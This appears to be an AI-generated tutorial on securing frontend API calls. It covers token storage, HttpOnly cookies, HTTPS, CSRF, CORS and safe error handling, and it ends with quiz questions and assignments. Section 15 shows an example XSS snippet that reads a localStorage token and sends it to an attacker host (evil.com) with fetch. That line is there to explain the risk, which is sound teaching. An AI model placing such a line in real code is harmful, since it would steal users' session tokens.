# Secure Frontend API Usage
## 1) What is Secure Frontend API Usage?

Secure frontend API usage means:

> calling backend APIs from the frontend in a way that protects user data, tokens, sessions, and application behavior from misuse or attack.

In simple words:

The frontend should **talk to the backend safely**.

That means:

* sending requests properly
* handling authentication carefully
* not exposing secrets
* validating responses
* preventing insecure browser behavior
* reducing attack surface

---

## 2) Why do we need it?

Frontend apps directly interact with APIs.

Examples:

* login API
* profile API
* payment API
* order API
* dashboard data API
* file upload API

If frontend API usage is insecure, problems happen such as:

* token theft
* session hijacking
* data leakage
* unauthorized requests
* API abuse
* XSS-based token access
* sensitive key exposure
* broken authorization flow

So secure frontend API usage is needed to protect:

* users
* business data
* accounts
* sessions
* payments
* trust

---

## 3) When do we need it?

You need secure frontend API usage whenever frontend code talks to backend services.

Especially in:

* login systems
* dashboards
* admin panels
* e-commerce apps
* banking apps
* SaaS products
* healthcare apps
* mobile web apps
* internal enterprise portals

---

## 4) Where is it used?

It is used in almost every modern frontend application:

* React apps
* Angular apps
* Vue apps
* Next.js apps
* vanilla JavaScript apps
* mobile web portals
* PWA applications

Anywhere you use:

* `fetch()`
* `axios`
* GraphQL clients
* REST API calls
* file upload endpoints
* auth-protected endpoints

---

## 5) Very simple meaning

Secure frontend API usage is about doing these things correctly:

* never store secrets in frontend
* send auth data safely
* avoid exposing private tokens
* validate input before sending
* handle errors without leaking information
* trust backend for authorization
* use HTTPS
* reduce XSS risk
* use secure session patterns

---

# 6) Real-Life Analogy

Imagine a company office.

Frontend = receptionist
Backend API = manager room
User token/session = visitor pass

Good security means:

* receptionist checks identity properly
* visitor pass is not left on the table
* nobody enters manager room without authorization
* confidential files are not announced loudly
* fake visitors are blocked

Bad security means:

* passcodes written on wall
* anyone can enter
* confidential files shown publicly
* receptionist trusts everybody blindly

That is exactly what happens with insecure API usage.

---

# 7) Core Engineering Idea

Frontend runs in the user’s browser.

That means:

> frontend code is not a trusted environment.

Users can inspect:

* JavaScript code
* network requests
* local storage
* session storage
* page HTML
* console logs

So the engineering rule is:

## Never trust frontend as a secure secret holder

Frontend can help with:

* sending requests
* collecting input
* attaching tokens
* rendering UI
* showing errors safely

But frontend must **not** be the final security authority.

The backend must enforce:

* authentication
* authorization
* data access rules
* role checks
* ownership checks
* input validation
* business rules

---

# 8) First Important Rule

## Never keep secrets in frontend code

Do not place these in frontend:

* database passwords
* private API keys
* JWT signing secrets
* admin credentials
* cloud secret keys
* payment secret keys

### Wrong

```javascript
const API_SECRET = "super-secret-key";
```

Because anyone can inspect bundled JS.

### Correct thinking

Frontend may use:

* public base URL
* public analytics key
* public client-side config

But sensitive secrets must stay only on backend.

---

# 9) HTTPS is mandatory

All API communication should happen over HTTPS.

Why?

Because HTTPS protects data in transit from being easily intercepted.

Without HTTPS:

* tokens can be exposed
* passwords can be exposed
* personal data can be exposed
* session cookies can be exposed

### Correct

```javascript
fetch("https://api.myapp.com/profile");
```

### Avoid

```javascript
fetch("http://api.myapp.com/profile");
```

---

# 10) Authentication vs Authorization

This is one of the biggest frontend mistakes.

## Authentication

Who are you?

## Authorization

What are you allowed to do?

Frontend can help send login/session info, but backend must decide permissions.

### Wrong thinking

“If I hide the admin button, the user cannot access admin API.”

That is false.

A user can still manually call the API through DevTools, Postman, or scripts.

### Correct rule

UI hiding is not security.
Backend authorization is security.

---

# 11) Where should tokens be stored?

This is a very important topic.

## Common options

* localStorage
* sessionStorage
* memory
* cookies

### localStorage

Easy to use, but risky if XSS happens because scripts can read it.

### sessionStorage

Slightly shorter lifetime, but still readable by JavaScript during XSS.

### memory storage

Safer than persistent browser storage for some setups, but token disappears on refresh.

### HttpOnly cookies

Often safer for session handling because JavaScript cannot directly read them.

---

# 12) Beginner-friendly token rule

## Avoid storing sensitive auth tokens in localStorage when possible

Why?

Because if your app suffers XSS, attacker scripts may read tokens and send them away.

A safer common pattern is:

* backend sets secure cookie
* cookie is `HttpOnly`
* cookie is `Secure`
* browser sends it automatically on allowed requests

This reduces direct token exposure to JavaScript.

---

# 13) What is an HttpOnly cookie?

An HttpOnly cookie is a cookie that JavaScript cannot read directly.

That means code like this cannot access it:

```javascript
document.cookie
```

for that protected cookie.

This is useful because even if malicious script runs, directly stealing that cookie becomes harder.

But remember:

* HttpOnly helps against token theft by JS
* it does not magically solve every attack
* you still need CSRF protection and strong backend checks

---

# 14) Secure cookie attributes

If cookies are used for auth/session, important attributes include:

* `HttpOnly`
* `Secure`
* `SameSite`

## HttpOnly

Prevents normal JavaScript access.

## Secure

Cookie should only travel over HTTPS.

## SameSite

Helps reduce cross-site request risks by controlling when cookies are sent.

---

# 15) Why localStorage is risky for auth tokens

Suppose attacker injects JavaScript through XSS:

```javascript
const token = localStorage.getItem("token");
fetch("https://evil.com/steal?token=" + token);
```

If token is in localStorage, attacker may steal it.

That is why frontend security and XSS protection are deeply connected to API security.

---

# 16) Should frontend send API keys?

Usually:

## Public client keys

May be acceptable for limited public use, such as public map SDK initialization.

## Private keys

Must never be sent to frontend.

Frontend should call your backend, and your backend should use the private key securely.

### Wrong flow

Frontend → third-party service with secret key

### Better flow

Frontend → your backend → third-party service

---

# 17) Use backend as security gate

Frontend should not directly own security-sensitive logic.

Better architecture:

```text
Browser → Your Backend API → External Services / Database
```

Why?

Because backend can:

* hide private secrets
* validate requests
* apply rate limits
* log abuse
* check roles
* sanitize data
* enforce rules centrally

---

# 18) Validate input before sending, but never trust only frontend validation

Frontend validation improves user experience.

Examples:

* required fields
* email format
* password length
* allowed file type
* numeric ranges

But remember:

## Frontend validation is for UX

## Backend validation is for security

Attackers can bypass frontend validation easily.

---

# 19) Example of good request flow

```javascript
async function fetchProfile() {
  try {
    const response = await fetch("/api/profile", {
      method: "GET",
      credentials: "include"
    });

    if (!response.ok) {
      throw new Error("Unable to load profile");
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Profile fetch failed");
    return null;
  }
}
```

### Why this is better

* uses relative API path
* sends cookies only when needed
* checks response status
* avoids exposing internal details to user
* handles failure gracefully

---

# 20) Be careful with `credentials: "include"`

This tells browser to include cookies for the request when allowed.

```javascript
fetch("/api/orders", {
  credentials: "include"
});
```

Use it only when your auth/session design requires cookies.

This must be aligned with backend CORS and cookie policy.

Do not randomly enable it everywhere without understanding the session model.

---

# 21) Do not leak sensitive information in errors

### Bad

```javascript
alert("SQL query failed on users table. Token expired at row parser stage.");
```

### Better

```javascript
alert("Something went wrong. Please try again.");
```

Detailed error data can help attackers understand system internals.

Frontend should show safe, user-friendly errors.

Detailed logs should stay in secure server-side monitoring.

---

# 22) Do not expose internal API structure unnecessarily

Avoid making frontend reveal sensitive information like:

* internal service names
* database structure
* admin-only routes
* debug tokens
* internal stack traces

Example of risky response exposure:

```json
{
  "error": "Permission denied in internal-admin-service role-check pipeline"
}
```

Safer response:

```json
{
  "error": "Access denied"
}
```

---

# 23) Handle authorization failures properly

When API returns unauthorized or forbidden:

* clear invalid auth state if needed
* redirect user safely
* avoid infinite retry loops
* avoid exposing raw backend internals

```javascript
if (response.status === 401) {
  // session expired, move to login
}
```

### Meaning

* `401` usually means not authenticated
* `403` usually means authenticated but not allowed

Frontend should react correctly, but backend remains the final authority.

---

# 24) Do not trust hidden fields or client-side flags

### Wrong

```javascript
if (user.isAdmin) {
  showDeleteAllButton();
}
```

This is okay for UI rendering, but not for security.

Because frontend state can be modified.

Never rely on:

* hidden buttons
* disabled inputs
* local flags
* route guards alone

Backend must still verify actual permission.

---

# 25) File upload security from frontend side

Frontend can help reduce bad uploads by checking:

* file size
* file extension
* MIME type
* image preview
* number of files

Example:

```javascript
function validateFile(file) {
  const maxSize = 2 * 1024 * 1024;

  if (file.size > maxSize) {
    throw new Error("File too large");
  }

  if (!["image/png", "image/jpeg"].includes(file.type)) {
    throw new Error("Invalid file type");
  }
}
```

But backend must still verify file type, scan content, rename safely, and store securely.

---

# 26) Prevent overexposure in browser logs

Do not log:

* tokens
* passwords
* OTP codes
* session IDs
* personal details
* private headers

### Bad

```javascript
console.log("Token:", token);
console.log("Login payload:", password);
```

Browser logs can be inspected easily.

---

# 27) Use safe response parsing

Do not assume every response is successful JSON.

Safer handling:

```javascript
async function safeApiCall() {
  const response = await fetch("/api/data");

  if (!response.ok) {
    throw new Error("Request failed");
  }

  const contentType = response.headers.get("content-type") || "";

  if (!contentType.includes("application/json")) {
    throw new Error("Unexpected response type");
  }

  return response.json();
}
```

Why this matters:

* avoids parsing surprises
* reduces client crashes
* handles broken or malicious responses more carefully

---

# 28) Avoid open redirect behavior

Suppose app redirects after login using URL query values.

### Risky

```javascript
window.location.href = redirectUrlFromQuery;
```

If attacker controls that value, users may be redirected to malicious sites.

### Better

Allow only approved internal paths.

```javascript
const allowedRoutes = ["/dashboard", "/profile", "/orders"];
```

---

# 29) CSRF awareness in cookie-based auth

If your app uses cookies for auth, browser may send them automatically.

That is convenient, but it can create cross-site request risks.

So secure setups usually combine:

* `SameSite` cookies
* CSRF tokens when needed
* backend origin checks
* careful CORS config

Frontend may need to send a CSRF header/token provided by backend.

---

# 30) CORS is not frontend security

Many beginners misunderstand this.

## CORS controls browser cross-origin rules

It does not replace backend authentication or authorization.

Even if CORS blocks some browser requests, attackers may still call APIs from non-browser tools if backend security is weak.

So:

* CORS is a browser protection layer
* backend auth and authorization are still required

---

# 31) Rate limiting is backend work, but frontend should behave responsibly

Frontend should avoid causing accidental request spam.

Examples:

* debounce search
* disable repeated submit clicks
* prevent duplicate payment requests
* stop endless retry loops

Example:

```javascript
button.disabled = true;
```

This improves UX and reduces accidental abuse, but backend should still enforce true rate limits and idempotency.

---

# 32) Secure API wrapper example

```javascript
async function apiRequest(url, options = {}) {
  const response = await fetch(url, {
    method: options.method || "GET",
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {})
    },
    credentials: "include",
    body: options.body ? JSON.stringify(options.body) : undefined
  });

  if (response.status === 401) {
    throw new Error("Unauthorized");
  }

  if (!response.ok) {
    throw new Error("API request failed");
  }

  return response.json();
}
```

### Why this is useful

* centralizes request behavior
* makes error handling consistent
* reduces repeated insecure patterns
* makes auth/session handling easier to manage

---

# 33) Real Use Case 1 — E-commerce checkout

Frontend collects:

* shipping details
* cart data
* payment step initiation

Frontend should:

* validate basic form input
* avoid exposing payment secrets
* send request only to trusted backend
* not log payment details
* handle duplicate submits carefully

Backend should:

* verify prices
* verify stock
* verify user
* create payment session securely

---

# 34) Real Use Case 2 — Admin dashboard

Frontend may show admin actions only for admin users.

But backend must still verify:

* role
* permission
* resource access
* audit logging

Even if non-admin user manually calls `/api/admin/delete-user`, backend must reject it.

---

# 35) Real Use Case 3 — Profile page

Frontend fetches user profile.

Good practice:

* use authenticated session properly
* handle `401/403` correctly
* avoid showing raw internal errors
* avoid storing sensitive profile data longer than needed
* do not expose private identifiers in UI unnecessarily

---

# 36) Real Use Case 4 — Search API

Frontend should:

* debounce search
* validate basic input
* sanitize displayed result rendering
* avoid reflecting raw HTML

Backend should:

* rate limit
* validate search params
* filter unauthorized results
* sanitize server output properly

---

# 37) Common Mistakes

## 1. Putting secret keys in frontend

Big security mistake.

## 2. Storing sensitive tokens in localStorage without understanding XSS risk

Very common mistake.

## 3. Thinking hidden UI equals security

It does not.

## 4. Trusting frontend role flags

Easy to manipulate.

## 5. Logging secrets in console

Risky.

## 6. Showing raw backend errors to users

Leaks system details.

## 7. Using HTTP instead of HTTPS

Unsafe for transport.

## 8. Skipping backend validation because frontend already validates

Dangerous assumption.

## 9. Directly calling third-party services with private credentials from browser

Wrong design.

## 10. Not handling session expiry safely

Can cause broken UX and insecure flows.

---

# 38) Interview-Friendly Definition

If asked:

**What is secure frontend API usage?**

You can say:

Secure frontend API usage means calling backend services from browser code in a way that protects user identity, session data, and application behavior. It includes using HTTPS, avoiding secret exposure, handling authentication safely, reducing token theft risks, validating inputs, showing safe errors, and always relying on backend authorization rather than trusting client-side logic.

---

# 39) 15 MCQ Questions

## Questions

### 1. Frontend code should be treated as:

A. fully trusted
B. private server code
C. untrusted client environment
D. database layer

### 2. Which should never be stored in frontend code?

A. app title
B. CSS class names
C. private API secret
D. public route name

### 3. Which protocol should be used for secure API communication?

A. FTP
B. HTTP
C. HTTPS
D. SMTP

### 4. Which storage option is often safer for session cookies because JavaScript cannot read it directly?

A. localStorage
B. sessionStorage
C. HttpOnly cookie
D. URL fragment

### 5. UI hiding admin button means:

A. backend security is complete
B. user can never access admin API
C. only visual hiding happened
D. authorization is finished

### 6. Frontend validation is mainly for:

A. replacing backend security
B. user experience improvement
C. encrypting passwords
D. database schema enforcement

### 7. Which must enforce authorization?

A. CSS
B. frontend router only
C. backend
D. browser extension

### 8. Which is risky in browser console?

A. logging theme value
B. logging token
C. logging page title
D. logging button text

### 9. CORS mainly controls:

A. browser cross-origin behavior
B. database authorization
C. password hashing
D. server encryption keys

### 10. Which is a dangerous frontend practice?

A. using relative API URLs
B. validating file size before upload
C. exposing secret third-party key
D. handling `401` response

### 11. Why is localStorage risky for sensitive auth tokens?

A. it increases CSS size
B. JavaScript can read it during XSS
C. it blocks HTTPS
D. it prevents JSON parsing

### 12. Which status usually means authenticated but not allowed?

A. 200
B. 201
C. 401
D. 403

### 13. Which is better architecture for private third-party integrations?

A. browser directly holds secret
B. frontend calls backend, backend calls third party
C. token in HTML comment
D. secret in localStorage

### 14. Which is true?

A. frontend role flags are enough for security
B. hidden fields are secure
C. backend must re-check permissions
D. disabled button prevents all attacks

### 15. Best summary:

A. frontend alone should handle security
B. backend should trust everything from browser
C. frontend should behave safely, backend should enforce security
D. secure API usage means only better UI

## MCQ Answers

1. C
2. C
3. C
4. C
5. C
6. B
7. C
8. B
9. A
10. C
11. B
12. D
13. B
14. C
15. C

---

# 40) 10 Subjective Questions with Answers

### 1. What is secure frontend API usage?

It is the practice of calling APIs from browser code safely without exposing secrets, leaking session data, or trusting client-side logic for real security.

### 2. Why is frontend considered untrusted?

Because users can inspect, modify, and replay frontend code and requests from their own browser environment.

### 3. Why should secrets never be stored in frontend?

Because bundled JavaScript, network activity, and browser tools can reveal those secrets to users or attackers.

### 4. Why is HTTPS important?

It protects data while traveling between browser and server, helping reduce interception risk.

### 5. Why is localStorage risky for sensitive tokens?

Because JavaScript can read it, so XSS attacks may steal tokens stored there.

### 6. Why are HttpOnly cookies often preferred?

Because JavaScript cannot directly access them, which helps reduce token theft from script-based attacks.

### 7. Why is frontend validation not enough?

Because attackers can bypass the UI and directly send requests to backend APIs.

### 8. What is the difference between authentication and authorization?

Authentication checks identity, while authorization checks what that identity is allowed to do.

### 9. Why is hiding an admin button not real security?

Because attackers can still manually call backend endpoints unless backend permission checks stop them.

### 10. What is the safest overall rule?

Let frontend be careful and minimal, but let backend enforce all real security decisions.

---

# 41) Practical Assignments

## Assignment 1

Create a reusable `apiRequest()` wrapper with:

* JSON handling
* status handling
* safe error handling
* optional headers
* optional body

## Assignment 2

Build a login flow design and explain:

* where token/session lives
* how session expiry is handled
* why backend must verify user on each protected request

## Assignment 3

Take an insecure example and fix it:

* remove hardcoded secret
* remove token logging
* add proper status handling
* move private API call to backend

## Assignment 4

Create a file upload form with frontend checks for:

* size
* type
* count

Then write what backend must still validate.

## Assignment 5

Write 10 insecure frontend API practices and their secure replacements.

---

# 42) Mini Project Ideas

## Project 1 — Secure Profile Dashboard

* cookie-based session
* protected profile fetch
* proper `401/403` handling
* safe error UI

## Project 2 — Secure Search Page

* debounced search
* sanitized rendering
* no token exposure
* no raw HTML injection

## Project 3 — Admin Panel Demo

* frontend role-based UI rendering
* backend authorization explanation
* safe route guard discussion

## Project 4 — Secure File Upload UI

* file checks
* progress UI
* clean error handling
* backend validation notes

---

# 43) Final Summary

## Main idea

Frontend can call APIs, but frontend is never the final security layer.

## Always remember

* never store secrets in frontend
* use HTTPS
* prefer safer session handling patterns
* do not trust hidden UI as security
* validate on frontend for UX, on backend for real protection
* do not log tokens or sensitive data
* backend must enforce authorization

## Easy memory line

**Frontend helps. Backend protects.**

If you want, I’ll do the next topic in the same strict format too.
